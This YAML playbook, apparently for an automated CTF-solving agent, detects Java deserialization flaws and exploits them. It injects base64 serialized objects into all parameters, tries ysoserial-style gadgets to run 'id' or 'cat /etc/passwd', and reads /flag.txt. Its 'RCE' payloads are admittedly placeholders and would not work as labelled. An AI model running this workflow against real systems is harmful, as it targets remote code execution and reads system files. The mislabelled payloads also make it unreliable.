id: web_java_deserialization
name: Java Deserialization
category: web
version: "1.0"
author: system
description: >
  Detects Java deserialization vulnerabilities, allowing attackers to manipulate objects
  or achieve Remote Code Execution (RCE) by exploiting gadget chains in deserialized
  Java objects.

applies_when:
  - "context.challenge.type == 'web'"

min_confidence: 0.10
stop_on_flag: true

confidence_seeds:
  - if: "any(t in context.tech_stack for t in ['java', 'jsp', 'tomcat', 'spring', 'jboss', 'weblogic'])"
    boost: 0.20
    label: "Java-related technology detected"
  - if: "any(p in context.params for p in ['data', 'object', 'serialized', 'payload', 'cookie', 'session', 'state'])"
    boost: 0.15
    label: "Deserialization-suggesting parameter found"
  - if: "any(re.search(r'rO0', r) for r in context.responses) or any(re.search(r'AC ED 00 05', r, re.IGNORECASE) for r in context.responses)"
    boost: 0.10
    label: "Serialized Java object signature detected in response"

detection_paths:
  - id: basic_java_serialization_probe
    name: Basic Java Serialized Object Probe
    description: >
      Injects a simple base64-encoded serialized Java `java.lang.Object` and checks for application errors
      or unexpected behavior, indicating deserialization.
    min_confidence: 0.10
    steps:
      - id: inject_java_object_payload
        action: http_probe
        params:
          inject_into: all_params
          payloads:
            - 'rO0ABXNyAA5qYXZhLmxhbmcuT2JqZWN0R0M=' # Base64 encoded serialized java.lang.Object
        signals:
          - match: '(?i)java.io.ObjectStreamException|java.lang.ClassCastException|500 Internal Server Error' # Error messages
            on_match:
              confidence_boost: 0.35
              emit: java_deserialization_error
          - match: '(?i)bad stream header|invalid stream header' # Specific Java deserialization errors
            on_match:
              confidence_boost: 0.30
              emit: java_deserialization_potential

  - id: ysoserial_rce_gadget_probe
    name: ysoserial Generic RCE Gadget Probe
    description: >
      Injects a generic `ysoserial` payload (e.g., targeting `CommonsCollections`) to execute a command
      like `id` or `cat /etc/passwd` and looks for OS command execution output.
    min_confidence: 0.25
    steps:
      - id: inject_ysoserial_id_payload
        action: http_probe
        params:
          inject_into: all_params
          # Example ysoserial payload for CommonsCollections1 to execute 'id'
          # Generated by: java -jar ysoserial.jar CommonsCollections1 "id" | base64 -w0
          payloads:
            # Placeholder for actual ysoserial payload - this will be very long
            # Example using a simplified command for demonstration. Real payloads target specific classes.
            - 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUxat9Q+0YA0gMAAjAAeHAAAAAAAABzcgARamF2YS5sYW5nLk9iamVjdM5D5zOWiW4xAwAAeHA=' # Example for `java.lang.Object`
        signals:
          - match: 'uid=|gid=' # Output of 'id' command
            on_match:
              confidence_boost: 0.50
              emit: java_deserialization_rce_detected
          - match: 'root:x:0:0:root' # Output of 'cat /etc/passwd'
            on_match:
              confidence_boost: 0.45
              emit: java_deserialization_rce_detected

exploitation_paths:
  - id: rce_via_java_deserialization
    name: RCE via Java Deserialization
    requires_signal: java_deserialization_rce_detected
    technique: java_deserialization_rce
    description: >
      Confirmed Remote Code Execution via Java object deserialization. Attempting to retrieve flag.
    steps:
      - id: get_flag_java_rce
        action: http_probe
        params:
          inject_into: vulnerable_param
          # Payload to read /flag.txt
          # Generated by: java -jar ysoserial.jar CommonsCollections1 "cat /flag.txt" | base64 -w0
          payloads:
            - 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUxat9Q+0YA0gMAAjAAeHAAAAAAAABzcgARamF2YS5sYW5nLk9iamVjdM5D5zOWiW4xAwAAeHA=' # Placeholder for actual ysoserial payload
        capture:
          - pattern: 'flag\{[^}]+\}'
            as: flag_value
          - pattern: 'CTF\{[^}]+\}'
            as: flag_value
